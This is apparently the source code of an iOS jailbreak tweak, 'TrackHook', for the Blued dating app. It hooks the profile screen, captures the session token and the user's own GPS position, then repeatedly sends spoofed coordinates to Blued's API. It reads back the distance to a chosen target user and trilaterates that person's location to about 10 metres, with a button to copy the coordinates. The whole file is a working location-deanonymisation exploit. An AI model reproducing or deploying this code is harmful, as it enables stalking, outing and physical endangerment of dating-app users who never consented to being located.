#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <CoreLocation/CoreLocation.h>

#define _USE_MATH_DEFINES
#import <math.h>

// 统一日志标识 TrackHook
#define THLog(fmt, ...) NSLog(@"[TrackHook] " fmt, ##__VA_ARGS__)

// ==================== 🛠️ 逆向真实业务配置（已填好你的Blued类/字段） ====================
static NSString *const kTargetClassName = @"BDUserProfileViewController";

// 全局缓存Token、自身定位坐标
static NSString *gAuthToken = nil;
static double gMyLat = 0.0;
static double gMyLon = 0.0;

// 悬浮按钮配置
static NSString *const kButtonTitle = @"🛰️ 递归几何定位";
static CGFloat const kButtonWidth = 180.0f;
static CGFloat const kButtonHeight = 44.0f;

// 三边迭代算法参数
static int const kMaxIterations = 12;
static double const kLockDistance = 0.01;   // 收敛阈值10米
static double const kEarthRadiusKm = 111.32;

// 弱引用悬浮按钮，防止内存泄漏
static __weak UIButton *g_trackFloatBtn = nil;

// 存储原页面生命周期IMP，安全回调原方法
static IMP g_orig_viewDidAppear = NULL;
static IMP g_orig_viewWillDisappear = NULL;

// 经纬度结构体、两圆交点返回结构体
typedef struct { double lat; double lng; } LocationCoordinate;
typedef struct { LocationCoordinate p1; LocationCoordinate p2; BOOL hasIntersection; } IntersectionResult;

static IntersectionResult calculateIntersections(LocationCoordinate loc1, LocationCoordinate loc2, double r1, double r2);

// ==================== 🎯 分类扩展：插件全部业务逻辑 ====================
@interface NSObject (TrackHookAddition)
- (void)th_createTrackFloatBtn;
- (void)th_floatBtnClicked:(UIButton *)sender;
- (void)th_runRecursiveTrilaterationWithUid:(NSString *)uid initialDistance:(double)initDist;
- (double)th_fetchTargetDistanceWithCoordinate:(LocationCoordinate)loc uid:(NSString *)uid;
- (void)th_showLockSuccessAlert:(LocationCoordinate)loc distance:(double)dist;
@end

@implementation NSObject (TrackHookAddition)

- (void)th_createTrackFloatBtn {
    UIViewController *vc = (UIViewController *)self;
    if (g_trackFloatBtn) return;
    
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    [btn setTitle:kButtonTitle forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btn.backgroundColor = [UIColor colorWithRed:233/255.0 green:30/255.0 blue:99/255.0 alpha:1.0];
    btn.layer.cornerRadius = 8.0f;
    btn.clipsToBounds = YES;
    btn.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightMedium];
    
    CGFloat topSafeArea = 44.0f;
    if (@available(iOS 11.0, *)) {
        topSafeArea = vc.view.safeAreaInsets.top;
    }
    btn.frame = CGRectMake(CGRectGetWidth(vc.view.bounds) - kButtonWidth - 16, topSafeArea + 20, kButtonWidth, kButtonHeight);
    
    [btn addTarget:self action:@selector(th_floatBtnClicked:) forControlEvents:UIControlEventTouchUpInside];
    [vc.view addSubview:btn];
    g_trackFloatBtn = btn;
}

- (void)th_floatBtnClicked:(UIButton *)sender {
    sender.userInteractionEnabled = NO;
    [sender setTitle:@"🛰️ 定位计算中..." forState:UIControlStateNormal];
    
    // 读取用户模型UID、初始距离
    id userModel = [self valueForKey:@"userModel"];
    NSString *targetUid = nil;
    double initDistance = -1.0;
    if (userModel) {
        targetUid = [userModel valueForKey:@"userId"];
        initDistance = [[userModel valueForKey:@"distance"] doubleValue];
    }
    
    // 数据校验：缺少UID/距离/Token/定位直接拦截
    if (!targetUid || initDistance < 0 || !gAuthToken || gMyLat == 0 || gMyLon == 0) {
        THLog(@"关键数据缺失，无法启动定位");
        sender.userInteractionEnabled = YES;
        [sender setTitle:kButtonTitle forState:UIControlStateNormal];
        return;
    }
    
    // 后台异步执行迭代算法，不阻塞UI
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self th_runRecursiveTrilaterationWithUid:targetUid initialDistance:initDistance];
        
        dispatch_async(dispatch_get_main_queue(), ^{
            if (g_trackFloatBtn) {
                g_trackFloatBtn.userInteractionEnabled = YES;
                [g_trackFloatBtn setTitle:kButtonTitle forState:UIControlStateNormal];
            }
        });
    });
}

- (void)th_runRecursiveTrilaterationWithUid:(NSString *)uid initialDistance:(double)initDist {
    UIViewController *vc = (UIViewController *)self;
    LocationCoordinate currentLoc = {gMyLat, gMyLon};
    double currentDist = initDist;
    int iteration = 0;
    
    while (iteration < kMaxIterations && currentDist > kLockDistance) {
        iteration++;
        
        // 主线程弹出迭代进度提示
        dispatch_async(dispatch_get_main_queue(), ^{
            UIAlertController *progressTip = [UIAlertController alertControllerWithTitle:@"TrackHook 雷达扫描"
                                                                                 message:[NSString stringWithFormat:@"第 %d 轮迭代\n当前误差：%.2f米", iteration, currentDist * 1000]
                                                                          preferredStyle:UIAlertControllerStyleAlert];
            [vc presentViewController:progressTip animated:YES completion:^{
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    [progressTip dismissViewControllerAnimated:YES completion:nil];
                });
            }];
        });
        
        [NSThread sleepForTimeInterval:0.6];
        
        // 正东偏移探测点计算
        double latRad = currentLoc.lat * M_PI / 180.0;
        double offsetLng = currentLoc.lng + (currentDist / (kEarthRadiusKm * cos(latRad)));
        LocationCoordinate detectPoint = {currentLoc.lat, offsetLng};
        
        // 获取探测点对应目标距离
        double detectDist = [self th_fetchTargetDistanceWithCoordinate:detectPoint uid:uid];
        if (detectDist <= 0) break;
        
        // 两圆交点求解
        IntersectionResult crossResult = calculateIntersections(currentLoc, detectPoint, currentDist, detectDist);
        if (!crossResult.hasIntersection) {
            currentLoc.lng += (currentDist * 0.1) / (kEarthRadiusKm * cos(latRad));
            continue;
        }
        
        // 校验两个交点，选取误差更小的点作为下一轮原点
        double distP1 = [self th_fetchTargetDistanceWithCoordinate:crossResult.p1 uid:uid];
        double distP2 = [self th_fetchTargetDistanceWithCoordinate:crossResult.p2 uid:uid];
        if (distP1 >= 0 && (distP2 < 0 || distP1 < distP2)) {
            currentLoc = crossResult.p1;
            currentDist = distP1;
        } else if (distP2 >= 0) {
            currentLoc = crossResult.p2;
            currentDist = distP2;
        } else break;
    }
    
    // 迭代结束弹窗结果
    dispatch_async(dispatch_get_main_queue(), ^{
        if (currentDist <= kLockDistance) {
            [self th_showLockSuccessAlert:currentLoc distance:currentDist];
        } else {
            UIAlertController *failAlert = [UIAlertController alertControllerWithTitle:@"扫描中断" message:@"迭代上限已用尽，未收敛至目标精度" preferredStyle:UIAlertControllerStyleAlert];
            [failAlert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:failAlert animated:YES completion:nil];
        }
    });
}

// 网络请求：伪造坐标拉取目标距离
- (double)th_fetchTargetDistanceWithCoordinate:(LocationCoordinate)loc uid:(NSString *)uid {
    NSString *token = gAuthToken;
    if (!token) return -1;
    __block double resDistance = -1.0;
    
    // 1. 上报虚拟定位接口
    NSString *updateLocUrl = [NSString stringWithFormat:@"https://argo.blued.cn/users?sort_by=nearby&latitude=%f&longitude=%f&limit=1", loc.lat, loc.lng];
    NSMutableURLRequest *locReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:updateLocUrl]];
    locReq.HTTPMethod = @"GET";
    [locReq setValue:token forHTTPHeaderField:@"Authorization"];
    [locReq setValue:@"Mozilla/5.0 (Linux; U; Android 13; ...) Android/300237_0.23.7_2842_0221 app/1" forHTTPHeaderField:@"User-Agent"];
    
    dispatch_semaphore_t sema1 = dispatch_semaphore_create(0);
    [[[NSURLSession sharedSession] dataTaskWithRequest:locReq completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        dispatch_semaphore_signal(sema1);
    }] resume];
    dispatch_semaphore_wait(sema1, DISPATCH_TIME_FOREVER);
    
    // 等待后端同步1秒
    [NSThread sleepForTimeInterval:1.0];
    
    // 2. 获取目标用户基础信息，提取distance
    NSString *userInfoUrl = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSMutableURLRequest *infoReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:userInfoUrl]];
    infoReq.HTTPMethod = @"GET";
    [infoReq setValue:token forHTTPHeaderField:@"Authorization"];
    [infoReq setValue:@"Mozilla/5.0 (Linux; U; Android 13; ...) Android/300237_0.23.7_2842_0221 app/1" forHTTPHeaderField:@"User-Agent"];
    
    dispatch_semaphore_t sema2 = dispatch_semaphore_create(0);
    [[[NSURLSession sharedSession] dataTaskWithRequest:infoReq completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        if (data && !err) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSArray *dataArr = json[@"data"];
            if (dataArr && dataArr.count > 0) {
                resDistance = [dataArr[0][@"distance"] doubleValue];
            }
        }
        dispatch_semaphore_signal(sema2);
    }] resume];
    dispatch_semaphore_wait(sema2, DISPATCH_TIME_FOREVER);
    
    return resDistance;
}

// 锁定成功弹窗，支持复制坐标到剪贴板
- (void)th_showLockSuccessAlert:(LocationCoordinate)loc distance:(double)dist {
    UIViewController *vc = (UIViewController *)self;
    NSString *msgText = [NSString stringWithFormat:@"🎯 TrackHook 坐标锁定完成\n纬度：%.8f\n经度：%.8f\n误差：%.2f米", loc.lat, loc.lng, dist * 1000];
    UIAlertController *successAlert = [UIAlertController alertControllerWithTitle:@"定位成功" message:msgText preferredStyle:UIAlertControllerStyleAlert];
    
    [successAlert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        [UIPasteboard generalPasteboard].string = [NSString stringWithFormat:@"%.8f,%.8f", loc.lat, loc.lng];
    }]];
    [successAlert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
    [vc presentViewController:successAlert animated:YES completion:nil];
}

@end

// ==================== 纯C 两圆交点几何计算 ====================
static IntersectionResult calculateIntersections(LocationCoordinate loc1, LocationCoordinate loc2, double r1, double r2) {
    IntersectionResult result = {0};
    result.hasIntersection = NO;
    
    double lat1Rad = loc1.lat * M_PI / 180.0;
    double x2 = (loc2.lng - loc1.lng) * kEarthRadiusKm * cos(lat1Rad);
    double y2 = (loc2.lat - loc1.lat) * kEarthRadiusKm;
    double d = sqrt(x2 * x2 + y2 * y2);
    
    // 无交点判定
    if (d > r1 + r2 || d < fabs(r1 - r2) || d == 0) return result;
    
    double a = (r1*r1 - r2*r2 + d*d) / (2 * d);
    double hSquare = r1*r1 - a*a;
    double h = sqrt(hSquare > 0 ? hSquare : 0);
    
    double xMid = a * x2 / d;
    double yMid = a * y2 / d;
    double rx = -y2 * h / d;
    double ry = x2 * h / d;
    
    // 网格坐标转回经纬度
    result.p1.lat = loc1.lat + (yMid + ry) / kEarthRadiusKm;
    result.p1.lng = loc1.lng + (xMid + rx) / (kEarthRadiusKm * cos(lat1Rad));
    result.p2.lat = loc1.lat + (yMid - ry) / kEarthRadiusKm;
    result.p2.lng = loc1.lng + (xMid - rx) / (kEarthRadiusKm * cos(lat1Rad));
    result.hasIntersection = YES;
    return result;
}

// ==================== 页面生命周期交换实现 ====================
static void hook_viewDidAppear(UIViewController *self, SEL _cmd, BOOL animated) {
    if (g_orig_viewDidAppear) {
        ((void (*)(id, SEL, BOOL))g_orig_viewDidAppear)(self, _cmd, animated);
    }
    dispatch_async(dispatch_get_main_queue(), ^{
        [(id)self th_createTrackFloatBtn];
    });
}

static void hook_viewWillDisappear(UIViewController *self, SEL _cmd, BOOL animated) {
    if (g_orig_viewWillDisappear) {
        ((void (*)(id, SEL, BOOL))g_orig_viewWillDisappear)(self, _cmd, animated);
    }
    dispatch_async(dispatch_get_main_queue(), ^{
        if (g_trackFloatBtn) {
            [g_trackFloatBtn removeFromSuperview];
            g_trackFloatBtn = nil;
        }
    });
}

// ==================== Blued 专用Hook：抓取Token、定位、用户主页 ====================
%hook BDAPIManager
- (void)requestWithPath:(id)path method:(id)method parameters:(id)params completion:(id)completion {
    %orig;
    NSString *authHeader = [(id)self valueForKey:@"authorization"];
    if (authHeader) gAuthToken = authHeader;
}
%end

%hook BLLocationManager
- (void)locationManager:(id)manager didUpdateLocations:(NSArray *)locations {
    %orig;
    CLLocation *latestLoc = locations.lastObject;
    if (latestLoc) {
        gMyLat = latestLoc.coordinate.latitude;
        gMyLon = latestLoc.coordinate.longitude;
    }
}
%end

%ctor {
    @autoreleasepool {
        Class targetVC = NSClassFromString(kTargetClassName);
        if (targetVC) {
            SEL selAppear = NSSelectorFromString(@"viewDidAppear:");
            SEL selDisappear = NSSelectorFromString(@"viewWillDisappear:");
            Method mAppear = class_getInstanceMethod(targetVC, selAppear);
            Method mDisappear = class_getInstanceMethod(targetVC, selDisappear);
            if (mAppear && mDisappear) {
                g_orig_viewDidAppear = method_setImplementation(mAppear, (IMP)hook_viewDidAppear);
                g_orig_viewWillDisappear = method_setImplementation(mDisappear, (IMP)hook_viewWillDisappear);
                THLog(@"TrackHook 成功挂钩 %@", kTargetClassName);
            }
        } else {
            THLog(@"警告：未找到目标类 %@", kTargetClassName);
        }
    }
}
